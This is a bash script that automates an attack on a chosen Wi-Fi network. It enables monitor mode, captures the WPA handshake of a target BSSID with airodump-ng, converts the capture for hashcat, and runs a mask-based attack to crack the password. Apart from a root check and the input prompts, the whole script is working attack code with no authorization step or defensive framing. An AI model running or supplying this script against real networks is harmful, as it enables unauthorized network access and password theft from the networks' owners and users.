#!/bin/bash

# Full Automation Wi-Fi Capture + Crack Script

if [[ $EUID -ne 0 ]]; then
   echo "[!] Please run as root (sudo)."
   exit 1
fi

echo "[*] Auto Wi-Fi Capture + Crack Started"

read -p "[?] Enter your wireless interface (e.g. wlan0): " INTERFACE
if [ -z "$INTERFACE" ]; then
    echo "[!] No interface entered."
    exit 1
fi

read -p "[?] Enter target BSSID: " BSSID
if [ -z "$BSSID" ]; then
    echo "[!] No BSSID entered."
    exit 1
fi

read -p "[?] Enter channel: " CHANNEL
if [ -z "$CHANNEL" ]; then
    echo "[!] No channel entered."
    exit 1
fi

read -p "[?] Enter output filename base (default: handshake): " OUTPUT
OUTPUT=${OUTPUT:-handshake}

# Enable monitor mode
airmon-ng check kill
airmon-ng start "$INTERFACE"
MONITOR_IFACE="${INTERFACE}mon"

echo "[*] Starting handshake capture. Press Ctrl+C when WPA handshake appears."
airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$OUTPUT" "$MONITOR_IFACE"

echo "[*] Converting .cap to .22000 format..."
hcxpcapngtool -o "$OUTPUT.22000" "$OUTPUT"-01.cap

if [ ! -f "$OUTPUT.22000" ]; then
    echo "[!] Conversion failed. No .22000 file generated."
    exit 1
fi

read -p "[?] Enter mask for cracking (example: ?u?u?u?u?u?d?d?d): " MASK
if [ -z "$MASK" ]; then
    echo "[!] No mask entered."
    exit 1
fi

echo "[+] Starting hashcat mask attack..."
hashcat -m 22000 -a 3 "$OUTPUT.22000" "$MASK" --force

if [ $? -eq 0 ]; then
    echo "[+] Hashcat finished. Check cracked passwords with:"
    echo "    hashcat --show -m 22000 $OUTPUT.22000"
else
    echo "[!] Hashcat failed or interrupted."
fi

# Disable monitor mode and restart network
echo "[*] Disabling monitor mode and restarting network..."
airmon-ng stop "$MONITOR_IFACE"
systemctl restart NetworkManager

echo "[*] Done!"